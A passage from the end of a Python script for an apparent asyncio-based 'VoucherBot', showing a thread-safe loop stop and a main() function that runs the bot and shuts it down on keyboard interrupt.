            self.checker.loop.call_soon_threadsafe(self.checker.loop.stop)

# ===============================================================
# Main Execution
# ===============================================================
def main():
    """Main function"""
    import signal
    import sys
    
    bot = VoucherBot()
    
    # Setup signal handlers
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Run bot
    try:
        loop.run_until_complete(bot.run())
    except KeyboardInterrupt:
        print("\nShutting down gracefully...")
        loop.run_until_complete(bot.shutdown())
    finally:
        loop.close()
        print("Bot stopped.")

if __name__ == "__main__":
    main()